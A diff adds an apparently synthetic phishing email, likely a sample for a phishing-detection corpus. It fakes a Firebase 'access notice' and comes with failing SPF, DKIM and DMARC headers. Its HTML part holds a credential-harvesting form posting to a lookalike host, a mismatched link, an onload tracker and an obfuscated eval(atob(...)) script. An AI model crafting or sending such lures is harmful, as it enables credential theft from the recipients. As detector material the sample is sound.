@@ -1,0 +1,35 @@
+From: notice@firebase-auth.firebaseapp.com
+To: victim8@example.com
+Subject: Access notice from Support [ref FBDE378]
+Date: Tue, 07 Mar 2002 05:46:00 -0500
+Message-ID: <phish-248-2eeb3578-9937-455d-9734-2cf8a85590c5@firebase-auth.firebaseapp.com>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 09 Mar 2002 21:18:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 21 Mar 2002 23:55:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 21 Mar 2002 19:03:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 24 Mar 2002 21:49:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 15 Mar 2002 21:06:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 12 Mar 2002 10:09:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 26 Mar 2002 06:04:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 20 Mar 2002 03:53:00 -0500
+Return-Path: <bounce@mail-fb51f00d.top>
+Reply-To: recovery8@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-fb51f00d.top; dkim=fail header.d=firebase-auth.firebaseapp.com; dmarc=fail header.from=firebase-auth.firebaseapp.com
+Received-SPF: fail (mx.example.com: domain of notice@firebase-auth.firebaseapp.com does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=firebase-auth.firebaseapp.com; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-248-e50a3595"
+
+--bnd-p-248-e50a3595
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.firebase-auth.firebaseapp.com/auth?t=FBDE378
+
+Reference: FBDE378
+--bnd-p-248-e50a3595
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.firebase-auth.firebaseapp.com/auth?t=FBDE378<br/><br/>Reference: FBDE378</p><p><a href="http://firebase-auth.firebaseapp.com/login">https://www.example.com/signin</a></p><form action="http://firebase-auth.firebaseapp.com/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-248-e50a3595--
